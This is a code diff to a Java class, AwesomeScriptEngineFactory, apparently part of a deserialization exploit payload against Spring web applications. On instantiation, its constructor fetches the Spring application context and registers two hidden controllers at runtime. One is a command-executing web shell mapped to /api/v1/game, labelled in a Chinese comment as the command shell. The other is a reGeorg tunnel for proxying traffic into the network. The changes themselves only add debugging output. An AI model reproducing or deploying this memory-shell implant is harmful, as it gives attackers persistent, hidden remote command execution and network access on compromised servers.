@@ -15,14 +15,18 @@ import java.util.List;
 public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
     public AwesomeScriptEngineFactory() {
         try {
+            //WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
+            //WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
             WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
             RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
+            System.out.println(context.toString());
             // 注册执行命令的shell
             Method method = (Class.forName("artsploit.GameInfo").getDeclaredMethods())[0];
             PatternsRequestCondition url = new PatternsRequestCondition("/api/v1/game");
             RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
             RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
             r.registerMapping(info, Class.forName("artsploit.GameInfo").newInstance(), method);
+            System.out.println("done");
 
             // 注册reGeorg tunnel
             Method method1 = (Class.forName("artsploit.Tunnel").getDeclaredMethods())[0];
@@ -32,7 +36,8 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
             r.registerMapping(info1, Class.forName("artsploit.Tunnel").newInstance(), method1);
 
         } catch (Exception e) {
-//            e.printStackTrace();
+            System.out.println(e.getMessage());
+            //e.printStackTrace();
         }
     }
 
